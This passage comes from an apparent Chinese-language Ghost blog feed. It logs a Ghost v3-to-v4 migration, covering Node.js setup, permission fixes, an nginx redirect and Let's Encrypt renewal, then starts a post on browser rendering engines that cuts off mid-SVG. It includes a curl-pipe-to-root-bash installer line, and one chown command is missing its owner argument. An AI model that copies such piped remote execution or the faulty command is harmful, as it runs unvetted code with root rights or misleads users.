# -L (--location) &#x5982;&#x679C;&#x670D;&#x52A1;&#x5668;&#x62A5;&#x544A;&#x8BF7;&#x6C42;&#x7684;&#x9875;&#x9762;&#x5DF2;&#x79FB;&#x52A8;&#x5230;&#x5176;&#x4ED6;&#x4F4D;&#x7F6E;,&#x5C06;&#x4F7F;curl&#x5728;&#x65B0;&#x4F4D;&#x7F6E;&#x4E0A;&#x91CD;&#x65B0;&#x6267;&#x884C;&#x8BF7;&#x6C42;
curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
sudo apt-get install -y nodejs
node -v
# v14.17.2
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="ghost">Ghost</h2>
<p>&#x6B64;&#x524D; Ghost &#x4E3A; v3&#xFF0C;&#x8FD0;&#x884C; <code>ghost update v3</code> &#x83B7;&#x53D6;&#x6700;&#x65B0;&#x7684; v3.x&#x7248;&#x672C;&#xFF0C;&#x7136;&#x540E;&#x8FD0;&#x884C; <code>ghost update</code> &#x83B7;&#x53D6;v4&#x3002;</p>
<p>&#x5728;&#x66F4;&#x65B0; ghost &#x671F;&#x95F4;&#x51FA;&#x73B0; ghost &#x76EE;&#x5F55;&#x6240;&#x5C5E;&#x6743;&#x9650;&#x95EE;&#x9898;&#x3002;</p>
<pre><code class="language-shell">sudo systemctl is-active ghost_zairesinatra-com
&#x2714; Checking system Node.js version - found v10.24.0
&#x2714; Ensuring user is not logged in as ghost user
&#x2716; Checking if logged in user is directory owner
&#x2716; Checking current folder permissions
&#x2714; Checking folder permissions
&#x2714; Checking file permissions
&#x2714; Checking content folder ownership
&#x2714; Checking memory availability
&#x2714; Checking free space
One or more errors occurred.

1) Checking if logged in user is directory owner

Message: Your user does not own the directory /var/www/ghost and is also not a member of the owning group.
You must either log in with the user that owns the directory or add your user to the owning group.
Help: https://ghost.org/docs/install/ubuntu/#create-a-new-user


2) Checking current folder permissions

Message: The directory /var/www/ghost is not writable by your user. You must grant write access and try again.
Help: https://ghost.org/docs/install/ubuntu/#create-a-directory

Debug Information:
    OS: Ubuntu, v18.04.4 LTS
    Node Version: v10.24.0
    Ghost Version: 3.41.9
    Ghost-CLI Version: 1.17.3
    Environment: production
    Command: &apos;ghost update&apos;

Try running ghost doctor to check your system for known issues.
</code></pre>
<p>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x662F;&#x7ED9; ghost &#x6587;&#x4EF6;&#x5939;&#x5F53;&#x524D;&#x7528;&#x6237;&#x6743;&#x9650;&#x3002;</p>
<pre><code class="language-shell">sudo chown /var/www/ghost
</code></pre>
<p>&#x8FD9;&#x662F;&#x66F4;&#x65B0;&#x51C6;&#x5907;&#x65F6;&#x51FA;&#x73B0;&#x7684;&#x62A5;&#x9519;&#xFF0C;&#x4ECE; Ghost-CLI 1.5.0 &#x5F00;&#x59CB;&#xFF0C;root&#x4E0D;&#x5141;&#x8BB8;&#x8FD0;&#x884C; Ghost &#x547D;&#x4EE4;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x9700;&#x8981;&#x5C06;&#x5F53;&#x524D;&#x5B89;&#x88C5;&#x8FC1;&#x79FB;&#x5230;&#x65B0;&#x7684; Linux &#x7528;&#x6237;&#x3002;</p>
<pre><code class="language-shell">We discovered that you are using the DigitalOcean One-Click install. You need to create a user with regular account privileges and migrate your installation to this user.
</code></pre>
<p>&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x65B0;&#x7528;&#x6237;&#xFF0C;&#x5E76;&#x5C06;&#x7528;&#x6237;&#x6DFB;&#x52A0;&#x5230; sudo &#x7EC4;&#x3002;</p>
<pre><code class="language-shell">$ adduser &lt;user&gt;
$ usermod -aG sudo &lt;user&gt;
</code></pre>
<p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x5B9E;&#x4F8B;&#x6587;&#x4EF6;&#x79FB;&#x52A8;&#x5230;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#xFF0C;&#x6700;&#x540E;&#x6587;&#x4EF6;&#x4ECE;&#x5C5E;&#x5173;&#x7CFB;&#x7ED9;&#x4E88;&#x65B0;&#x7528;&#x6237;&#x3002;</p>
<pre><code class="language-shell">mkdir -p /home/&lt;user&gt;/.ghost/

chown &lt;user&gt;:&lt;user&gt; /home/&lt;user&gt;/.ghost

mv /root/.ghost/config /home/&lt;user&gt;/.ghost/config

chown &lt;user&gt;:&lt;user&gt; /home/&lt;user&gt;/.ghost/config
</code></pre>
<p>&#x63A5;&#x4E0B;&#x6765;&#x5207;&#x6362;&#x5230; Ghost &#x5B89;&#x88C5;&#x76EE;&#x5F55;&#xFF08;/var/www/ghost/&#x5728; DigitOcean One-Click &#x5B89;&#x88C5;&#x4E2D;&#x662F;&#x9ED8;&#x8BA4;&#x7684;&#xFF09;&#x4EE5;&#x66F4;&#x6539;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#x7684;&#x6240;&#x6709;&#x6743;&#x3002;</p>
<pre><code class="language-shell">$ cd /var/www/ghost
$ find . -group root -user root -exec chown &lt;user&gt;:&lt;user&gt; {} \;
</code></pre>
<p>&#x4EE5;&#x65B0;&#x7528;&#x6237;&#x8EAB;&#x4EFD;&#x767B;&#x5F55;&#x3002;</p>
<pre><code class="language-shell">$ su - &lt;user&gt;
</code></pre>
<p>&#x5B8C;&#x6210;&#x540E;&#x5219;&#x53EF;&#x7EE7;&#x7EED;&#x8FDB;&#x884C; ghost &#x66F4;&#x65B0;&#x3002;</p>
<pre><code class="language-shell">$ ghost update v3
+ sudo systemctl is-active ghost_zairesinatra-com
&#x2714; Checking system Node.js version - found v14.17.2
&#x2714; Ensuring user is not logged in as ghost user
&#x2714; Checking if logged in user is directory owner
&#x2714; Checking current folder permissions
&#x2714; Checking folder permissions
&#x2714; Checking file permissions
&#x2714; Checking content folder ownership
&#x2714; Checking memory availability
&#x2714; Checking free space
&#x2714; Checking for available migrations
&#x2714; Checking for latest Ghost version

# 3.42.5

This release contains a security patch.

* &#x1F512; Added a way to hide the secret settings once they are set - Thibaut Patel

---

View the changelogs for full details:
* Ghost - https://github.com/tryghost/ghost/compare/3.42.4...3.42.5
* Ghost-Admin - https://github.com/tryghost/admin/compare/3.42.4...3.42.5

&#x2714; Fetched release notes
Version already installed.
&#x2139; Downloading and updating Ghost [skipped]
&#x2714; Linking latest Ghost and recording versions
&#x2139; Removing old Ghost versions [skipped]
newghostzs@VM-4-10-ubuntu:/var/www/ghost$ ghost update
+ sudo systemctl is-active ghost_zairesinatra-com
&#x2714; Checking system Node.js version - found v14.17.2
&#x2714; Ensuring user is not logged in as ghost user
&#x2714; Checking if logged in user is directory owner
&#x2714; Checking current folder permissions
&#x2714; Checking folder permissions
&#x2714; Checking file permissions
&#x2714; Checking content folder ownership
&#x2714; Checking memory availability
&#x2714; Checking free space
&#x2714; Checking for available migrations
&#x2714; Checking for latest Ghost version

# 4.10.1

* &#x1F41B; Fixed GScan error when handling partials with undefined names - Thibaut Patel

---

View the changelogs for full details:
* Ghost - https://github.com/tryghost/ghost/compare/v4.10.0...v4.10.1
* Admin - https://github.com/tryghost/admin/compare/v4.10.0...v4.10.1

&#x2714; Fetched release notes
&#x2714; Downloading and updating Ghost to v4.10.1


Checking theme compatibility for Ghost 4.10.1

&#x2714; Your theme is compatible.

You can also check theme compatibility at https://gscan.ghost.org

Please review the full list of breaking changes at https://ghost.org/docs/changes/

? Are you sure you want to proceed with migrating to Ghost 4.10.1? Yes
&#x2714; Updating to a major version
&#x2714; Linking latest Ghost and recording versions
&#x2714; Removing old Ghost versions
</code></pre>
<p>&#x5B8C;&#x6210;&#x542F;&#x52A8;&#x540E;&#x975E; https &#x72B6;&#x6001;&#xFF0C;&#x914D;&#x7F6E; config.production.json &#x6587;&#x4EF6;&#x540E;&#x91CD;&#x542F;&#x5373;&#x53EF;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="nginx">Nginx</h2>
<p>&#x8003;&#x8651;&#x5230;&#x76F4;&#x63A5;&#x8F93;&#x5165;&#x6839;&#x57DF;&#x540D;&#x91CD;&#x5B9A;&#x5411;&#x5230; www &#x7684;&#x9875;&#x9762;&#xFF0C;&#x5728; ghost &#x81EA;&#x5E26;&#x751F;&#x6210;&#x7684; nginx ssl &#x914D;&#x7F6E;&#x5916;&#xFF0C;&#x989D;&#x5916;&#x81EA;&#x884C;&#x5199;&#x4E00;&#x4E2A; nginx &#x91CD;&#x5B9A;&#x5411;&#x7684; conf &#x914D;&#x7F6E;&#x3002;</p>
<pre><code class="language-shell"># sites-available &#x4E2D;&#x7684; zs.com-ssl.conf
server {
	#&#x76D1;&#x542C; 80 &#x548C; 443&#x7AEF;&#x53E3;
        listen 80;
        listen 443 ssl http2;
        #&#x57DF;&#x540D;
        server_name	zs.com;
        # &#x653E;&#x7F6E;&#x7684;&#x9879;&#x76EE;&#x8DEF;&#x5F84;
        root /var/www/html;
        # &#x663E;&#x793A;&#x9996;&#x9875;
        index index.html;
        # &#x914D;&#x7F6E;ssl&#x8BC1;&#x4E66;&#x7684;&#x4F4D;&#x7F6E;-&#x653E;&#x7F6E;&#x4F4D;&#x7F6E;
        # &#x4E5F;&#x53EF;&#x901A;&#x8FC7; ghost config url https://xxx.com &#x4E0E; ghost setup nginx ssl &#x5B8C;&#x6210;
        # ghost &#x521D;&#x6B21;&#x8BBE;&#x7F6E;&#x4E86;url&#x540E;&#x53EF;&#x901A;&#x8FC7; ghost setup ssl &#x76F4;&#x63A5;&#x751F;&#x6210; ssl nginx &#x914D;&#x7F6E;
        ssl_certificate	/etc/nginx/ssl/zs.com_nginx/zs.com_bundle.crt;
        ssl_certificate_key	/etc/nginx/ssl/zs.com_nginx/zs.com.key;
        #&#x5F00;&#x542F;&#x5F3A;&#x5236;http&#x8DF3;&#x8F6C;https
        if ($server_port = 80){
       	rewrite ^(/.*)$ https://$host$1 permanent;
       	}
	location / {
		return 301 https://www.zs.com$request_uri;
	}
}
</code></pre>
<pre><code class="language-shell"># &#x5EFA;&#x7ACB;&#x8F6F;&#x8FDE;&#x63A5;
$ ln -s /etc/nginx/sites-available/zs.com-ssl.conf /etc/nginx/sites-enabled/zs.com-ssl.conf
</code></pre>
<pre><code class="language-shell"># &#x6D4B;&#x8BD5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;
$ sudo nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
# &#x91CD;&#x542F;&#x670D;&#x52A1;
$ sudo nginx -s reload
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="lets-encrypt">Let&apos;s Encrypt</h2>
<p>&#x6536;&#x5230;&#x5B98;&#x65B9;&#x90AE;&#x4EF6;&#x7684;&#x63D0;&#x9192;&#xFF0C;&#x8868;&#x793A;&#x5728;&#x4E00;&#x5B9A;&#x65F6;&#x95F4;&#x540E; LetsEncrypt &#x7684;&#x8BC1;&#x4E66;&#x5C06;&#x8981;&#x5230;&#x671F;&#xFF0C;&#x8FD9;&#x91CC;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x901A;&#x8FC7; Ghost &#x96C6;&#x6210;&#x7684; LetsEncrypt &#x8BC1;&#x4E66;&#x53EA;&#x6709; 90 &#x5929;&#x7684;&#x6709;&#x6548;&#x671F;&#xFF0C;&#x610F;&#x5473;&#x7740;&#x9700;&#x8981;&#x4E00;&#x4E2A;&#x5B63;&#x5EA6;&#x624B;&#x52A8;&#x66F4;&#x65B0;&#x4E00;&#x6B21;&#x3002;</p>
<blockquote>
<p>Your certificate (or certificates) for the names listed below will expire in 17 days (on 20 Jul 19 07:56 +0000). Please make sure to renew your certificate before then, or visitors to your web site will encounter errors.<br>
We recommend renewing certificates automatically when they have a third of their total lifetime left. For Let&apos;s Encrypt&apos;s current 90-day certificates, that means renewing 30 days before expiration. See <a href="https://letsencrypt.org/docs/integration-guide/">https://letsencrypt.org/docs/integration-guide/</a> for details.</p>
</blockquote>
<ul>
<li>Renew Ghost Let&apos;s Encrypt SSL</li>
</ul>
<pre><code class="language-shell"># Renew certificate
ghost setup ssl-renew
# Switch to root user
sudo su
# Upgrade acme.sh inside letsencrypt
&quot;/etc/letsencrypt&quot;/acme.sh --upgrade --home &quot;/etc/letsencrypt&quot;
# Renew SSL through acme.sh
&quot;/etc/letsencrypt&quot;/acme.sh --cron --home &quot;/etc/letsencrypt&quot; --debug --log
# &#x6267;&#x884C;&#x5230;&#x8FD9;&#x4E00;&#x6B65;&#x82E5;&#x51FA;&#x73B0; Add &apos;--force&apos; to force to renew. &#x7684;&#x63D0;&#x793A;&#x8868;&#x793A;&#x5F53;&#x524D;&#x8FD8;&#x662F;&#x5904;&#x4E8E;&#x6709;&#x6548;&#x671F;, &#x9700;&#x8981;&#x8FDB;&#x884C;&#x5F3A;&#x884C;&#x66F4;&#x65B0;
&quot;/etc/letsencrypt&quot;/acme.sh --cron --home &quot;/etc/letsencrypt&quot; --debug --log --force
# &#x67E5;&#x770B;&#x5F53;&#x524D;&#x8BC1;&#x4E66;&#x4FE1;&#x606F;
/etc/letsencrypt/acme.sh --home &quot;/etc/letsencrypt&quot; --list
</code></pre>
<ul>
<li>check expiry date of SSL cert for ghost blog =&gt; <a href="https://www.thesslstore.com/knowledgebase/ssl-support/how-to-check-a-certificates-expiration-date-chrome/">clickme</a></li>
</ul>
<p>Chrome &#x4E2D;&#x70B9;&#x5F00; view site information &#x5E76;&#x9009;&#x62E9; connection is secure&#xFF0C;&#x5728; certificate is valid &#x4E2D;&#x67E5;&#x770B;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="bugs-%E8%A7%A3%E5%86%B3">Bugs &#x89E3;&#x51B3;</h2>
<p>&#x8FC1;&#x79FB;&#x4E00;&#x5F00;&#x59CB;&#x5F88;&#x987A;&#x5229;&#xFF0C;Ghost &#x652F;&#x6301;&#x5BFC;&#x51FA;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x5185;&#x5BB9;&#x3002;&#x7136;&#x800C;&#x5185;&#x7F6E; Labs &#x4EE5; json &#x6587;&#x4EF6;&#x5BFC;&#x5165;&#x6587;&#x7AE0;&#x7684;&#x529F;&#x80FD;&#x5E76;&#x4E0D;&#x9002;&#x7528;&#x4E8E;&#x5BFC;&#x5165;&#x56FE;&#x50CF;&#x3002;&#x4F7F;&#x7528; FTP &#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;&#x5E76;&#x5C06;&#x6240;&#x6709;&#x7684;&#x56FE;&#x50CF;&#x76F4;&#x63A5;&#x590D;&#x5236;&#x5230; content/images/ &#x6587;&#x4EF6;&#x5939;&#x540E;&#xFF0C;&#x770B;&#x8D77;&#x6765;&#x4E00;&#x5207;&#x6B63;&#x5E38;&#x3002;&#x4F46;&#x662F;&#x6B21;&#x65E5;&#x5199;&#x4E86;&#x4E00;&#x7BC7;&#x65B0;&#x5E16;&#xFF0C;&#x5728;&#x51C6;&#x5907;&#x4E0A;&#x4F20;&#x6587;&#x7AE0;&#x56FE;&#x7247;&#x65F6;&#xFF0C;&#x5374;&#x63D0;&#x793A;&#x4E0A;&#x4F20;&#x5931;&#x8D25;&#xFF0C;&#x539F;&#x56E0;&#x662F;&#x5185;&#x90E8;&#x670D;&#x52A1;&#x5668;&#x9519;&#x8BEF;&#x3002;</p>
<p>Ghost &#x65E0;&#x6CD5;&#x5C06;&#x56FE;&#x50CF;&#x4FDD;&#x5B58;&#x5728; content &#x6587;&#x4EF6;&#x5939;&#x4E2D;&#x901A;&#x5E38;&#x5E94;&#x8BE5;&#x4ECE;&#x6743;&#x9650;&#x65B9;&#x9762;&#x8003;&#x8651;&#x3002;&#x4F17;&#x6240;&#x5468;&#x77E5;&#xFF0C;&#x5E94;&#x8BE5;&#x4F7F;&#x7528; ghost &#x7528;&#x6237;&#x8BBF;&#x95EE;&#x548C;&#x4FEE;&#x6539;&#x535A;&#x5BA2;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x5C31;&#x6211;&#x800C;&#x8A00;&#xFF0C;&#x53EF;&#x80FD;&#x56E0;&#x4E3A;&#x662F;&#x590D;&#x5236;&#x7C98;&#x8D34;&#x7684; images-backup &#x6587;&#x4EF6;&#x5939;&#xFF0C;&#x6240;&#x4EE5;&#x4F1A;&#x5177;&#x6709;&#x4E0D;&#x540C;&#x7528;&#x6237;&#x6743;&#x9650;&#xFF0C;&#x8FD9;&#x5C31;&#x963B;&#x6B62;&#x4E86; Ghost &#x4FDD;&#x5B58;&#x56FE;&#x50CF;&#x3002;</p>
<pre><code class="language-shell"># &#x89E3;&#x51B3; ghost Internal server error, cannot upload image &#x7684;&#x65B9;&#x5F0F;
sudo chown -R &lt;ghostuser&gt;:&lt;ghostuser&gt; ./content
</code></pre>
<p>&#x4ECE;&#x903B;&#x8F91;&#x4E0A;&#x6765;&#x8BF4;&#xFF0C;&#x5230;&#x6B64;&#x95EE;&#x9898;&#x5C31;&#x5E94;&#x8BE5;&#x7ED3;&#x675F;&#x4E86;&#xFF0C;&#x4F46;&#x5728;&#x6211;&#x5C06;&#x670D;&#x52A1;&#x5668;&#x91CD;&#x542F;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#x7684;&#x65F6;&#x5019;&#x53C8;&#x51FA;&#x73B0;&#x4E86;&#x65B0;&#x7684; Bug&#x3002;</p>
<pre><code class="language-shell">$ ghost start
+ sudo systemctl is-active ghost_www-zairesinatra-com
&#x2714; Checking system Node.js version - found v16.14.2
&#x2714; Ensuring user is not logged in as ghost user
&#x2714; Checking if logged in user is directory owner
&#x2714; Checking current folder permissions
+ sudo systemctl is-active ghost_www-zairesinatra-com
&#x2714; Validating config
&#x2714; Checking folder permissions
&#x2714; Checking file permissions
&#x2714; Checking memory availability
&#x2714; Checking binary dependencies
&#x2714; Checking systemd unit file
&#x2714; Checking systemd node version - found v16.14.2
&#x2716; Starting Ghost: www-zairesinatra-com
A SystemError occurred.

Message: Systemd process manager has not been set up or is corrupted.
Help: Run ghost setup linux-user systemd and try again.

Debug Information:
    OS: Ubuntu, v18.04.4 LTS
    Node Version: v16.14.2
    Ghost Version: 4.44.0
    Ghost-CLI Version: 1.19.3
    Environment: production
    Command: &apos;ghost start&apos;

Try running ghost doctor to check your system for known issues.

You can always refer to https://ghost.org/docs/ghost-cli/ for troubleshooting.
</code></pre>
<p>&#x5C3D;&#x7BA1;&#x63D0;&#x793A;&#x8BF4;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5; setup &#x547D;&#x4EE4;&#x89E3;&#x51B3;&#x6B64;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x5728;&#x8FD0;&#x884C;&#x540E;&#x4F1A;&#x53D1;&#x73B0;&#x8DF3;&#x8FC7;&#x8BBE;&#x7F6E;&#x7684;&#x5C34;&#x5C2C;&#x73B0;&#x72B6;&#x3002;</p>
<pre><code class="language-shell">$ ghost setup linux-user systemd
Systemd service has already been set up. Skipping Systemd setup
&#x2139; Setting up Systemd [skipped]
</code></pre>
<p>&#x6B64;&#x65F6;&#x89C2;&#x6469;<a href="https://ghost.org/docs/ghost-cli/">&#x5B98;&#x65B9;&#x6587;&#x6863;</a>&#xFF0C;&#x7531;&#x4E8E; Ghost &#x7684;&#x67D0;&#x4E9B;&#x8F93;&#x51FA;&#x53EF;&#x80FD;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x5728;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x51FA;&#x4E8E;&#x8C03;&#x8BD5;&#x76EE;&#x7684;&#x5C1D;&#x8BD5; <code>ghost run</code> &#x547D;&#x4EE4;&#x3002;</p>
<pre><code class="language-shell">$ ghost run
INFO Ghost is running in production...
...
Sharp wasn&apos;t installed
</code></pre>
<p>&#x5728; github issue &#x4E0A;&#x67E5;&#x5230;&#x4E0E; Sharp &#x76F8;&#x5173;&#x7684;&#x95EE;&#x9898;<a href="https://github.com/TryGhost/Ghost/issues/10421">&#x70B9;&#x6B64;</a>&#x3002;</p>
<p>&#x7531;&#x4E8E;&#x662F;&#x66F4;&#x6362;&#x4E86;&#x6587;&#x4EF6;&#x5939;&#x5185;&#x5BB9;&#x540E;&#x51FA;&#x73B0;&#x7684;&#x72B6;&#x51B5;&#xFF0C;&#x4E14;&#x5F00;&#x59CB;&#x5E76;&#x672A;&#x8868;&#x793A; Sharp &#x5B58;&#x5728;&#x95EE;&#x9898;&#xFF0C;&#x6839;&#x636E;<a href="https://github.com/TryGhost/Ghost-CLI/issues/397">&#x6B64;&#x5904;</a>&#x4E0B;&#x8FF0;&#x8FD9;&#x6BB5;&#x8BDD;&#x7684;&#x7406;&#x89E3;&#xFF0C;&#x5C1D;&#x8BD5;&#x91CD;&#x65B0;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#xFF0C;&#x6700;&#x540E;&#x6210;&#x529F;&#x7684;&#x5B8C;&#x6210;&#x4FEE;&#x590D;&#x3002;</p>
<p>&quot;Directory was linked using NFS so ghost-cli couldn&apos;t change its permissions or owner, therefore it kind of silently failed where it did.&quot;</p>
<pre><code class="language-shell">$ id -u ghost
$ stat /var/www/&lt;ghost-blog&gt;
$ ghost setup # or ghost setup systemd
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[NodeJS]]></title><description><![CDATA[Atwood 定律：任何能够用 JavaScript 实现的应用系统，最终都必将用 JavaScript 实现。]]></description><link>yourdomain.com/node/</link><guid isPermaLink="false">612a36d2f60ced083419000d</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Thu, 08 Jul 2021 15:02:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2021/11/NodeJS.jpg" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B">&#x5FEB;&#x901F;&#x4E0A;&#x624B;</h2>
<h3 id="%E6%B5%8F%E8%A7%88%E5%99%A8%E5%86%85%E6%A0%B8">&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;</h3>
<blockquote>
<img src="yourdomain.com/content/images/2021/11/NodeJS.jpg" alt="NodeJS"><p>=&gt; &#x4E3B;&#x6D41;&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;&#x7EC4;&#x6210;<br>
IE &#x5230; Edge &#x6D4F;&#x89C8;&#x5668; =&gt; Trident &#x8F6C;&#x5411; Blink<br>
Chrome &#x6D4F;&#x89C8;&#x5668; =&gt; Webkit &#x8F6C;&#x5411; Blink -&gt; &#x7EDF;&#x79F0;&#x4E3A; Chromium<br>
Firefox &#x6D4F;&#x89C8;&#x5668; =&gt; Gecko<br>
Safari &#x6D4F;&#x89C8;&#x5668; =&gt; Webkit<br>
Opera &#x6D4F;&#x89C8;&#x5668; =&gt; Presto &#x53D8;&#x66F4;&#x4E3A; Webkit&#xFF0C;&#x73B0;&#x5728;&#x8F6C;&#x5411; Blink<br>
&#x4E8B;&#x5B9E;&#x4E0A;&#xFF0C;&#x5E38;&#x8BF4;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;&#x6307;&#x7684;&#x662F;&#x6D4F;&#x89C8;&#x5668;&#x6392;&#x7248;&#x5F15;&#x64CE; layout engine&#xFF0C;&#x4E5F;&#x79F0;&#x4E3A;&#x6D4F;&#x89C8;&#x5668;&#x5F15;&#x3001;&#x9875;&#x9762;&#x6E32;&#x67D3;&#x5F15;&#x64CE;&#x6216;&#x6837;&#x677F;&#x5F15;&#x64CE;</p>
</blockquote>
<ul>
<li>&#x6D4F;&#x89C8;&#x5668;&#x5185;&#x6838;&#x8D1F;&#x8D23;&#x5BF9;&#x7F51;&#x9875;&#x8BED;&#x6CD5;&#x7684;&#x89E3;&#x91CA;&#x4EE5;&#x53CA;&#x6E32;&#x67D3;&#x7F51;&#x9875;&#xFF0C;&#x901A;&#x5E38;&#x7531;&#x6E32;&#x67D3;&#x5F15;&#x64CE;&#x548C; JS &#x5F15;&#x64CE;&#x4E24;&#x90E8;&#x5206;&#x7EC4;&#x6210;</li>
<li>Webkit &#x4E2D;&#x662F; WebCore &#x8D1F;&#x8D23; HTML &#x89E3;&#x6790;&#x3001;&#x5E03;&#x5C40;&#x3001;&#x6E32;&#x67D3;&#xFF1B;JavaScriptCore &#x8D1F;&#x8D23;&#x89E3;&#x6790;&#xFF0C;&#x6267;&#x884C; JS &#x4EE3;&#x7801;</li>
</ul>
<h3 id="%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E8%BF%87%E7%A8%8B">&#x6D4F;&#x89C8;&#x5668;&#x6E32;&#x67D3;&#x8FC7;&#x7A0B;</h3>
<p>&#x5728;&#x6D4F;&#x89C8;&#x7F51;&#x9875;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6240;&#x6709;&#x8D44;&#x6E90;&#x5E76;&#x975E;&#x4E00;&#x6346;&#x4E0B;&#x8F7D;&#xFF0C;&#x800C;&#x662F;&#x89E3;&#x6790;&#x65F6;&#x5230;&#x5177;&#x4F53;&#x7684;&#x6807;&#x7B7E;&#x65F6;&#xFF0C;&#x518D;&#x53BB;&#x76F8;&#x5E94;&#x7684;&#x5B9A;&#x4F4D;&#x5904;&#x4E0B;&#x8F7D;&#x8D44;&#x6E90;&#x3002;</p>
<ul>
<li>&#x8FDB;&#x5165;&#x9875;&#x9762; HTML &#x88AB;&#x9996;&#x5148;&#x4E0B;&#x8F7D;&#xFF0C;HTML Parser &#x5F00;&#x59CB;&#x89E3;&#x6790;&#x6807;&#x7B7E;&#x5E76;&#x751F;&#x6210; DOM Tree</li>
<li>DOM Tree &#x751F;&#x6210;&#x65F6;&#x4F1A;&#x6709; JS &#x5F15;&#x64CE;&#x5E2E;&#x52A9;&#x89E3;&#x6790; JavaScript &#x4EE3;&#x7801;&#x5BF9; DOM &#x8FDB;&#x884C;&#x64CD;&#x4F5C;</li>
<li>&#x56E0; HTML &#x7684;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x662F;&#x81EA;&#x4E0A;&#x800C;&#x4E0B;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x9047;&#x89C1; &lt;link&gt; &#x6807;&#x7B7E;&#x8868;&#x793A;&#x7684; CSS &#x6837;&#x5F0F;&#x65F6;&#xFF0C;&#x4F1A;&#x6839;&#x636E; CSS Paser &#x751F;&#x6210;&#x5BF9;&#x5E94;&#x7684; CSS Rules &#x5E76;&#x4E0E; DOM Tree &#x7ED3;&#x5408;&#x4EA7;&#x751F; Render Tree</li>
<li>Render Tree &#x5728;&#x751F;&#x6210;&#x65F6;&#x4F1A;&#x6839;&#x636E; Layout Engine &#x8FDB;&#x884C;&#x9488;&#x5BF9;&#x6D4F;&#x89C8;&#x5668;&#x72B6;&#x6001;&#x7684;&#x9002;&#x914D;&#x8C03;&#x6574;&#xFF0C;&#x5E76;&#x5728;&#x5B8C;&#x6210;&#x540E;&#x8FDB;&#x884C; Painting &#x4E0E; Display</li>
<li>HTML &#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x4E2D;&#x9047;&#x89C1; JavaScript &#x4F1A;&#x505C;&#x6B62;&#x89E3;&#x6790;&#xFF0C;&#x4E0D;&#x540C;&#x4E8E; CSS &#x5F02;&#x6B65;&#x52A0;&#x8F7D;&#x6267;&#x884C;&#xFF0C;&#x56E0;&#x4E3A; JavaScript &#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x64CD;&#x4F5C; DOM</li>
</ul>
<div style="overflow:scroll">
<svg id="SvgjsSvg1006" width="1051" height="474" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.com/svgjs"><defs id="SvgjsDefs1007"><marker id="SvgjsMarker1078" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1079" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1082" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1083" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1086" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1087" d="M0,0 L14,5 L0,10 L0,0" fill="#323232" stroke="#323232" stroke-width="1"/></marker><marker id="SvgjsMarker1090" markerwidth="14" markerheight="10" refx="10" refy="5" viewbox="0 0 14 10" orient="auto" markerunits="userSpaceOnUse" stroke-dasharray="0,0"><path id="SvgjsPath1091" 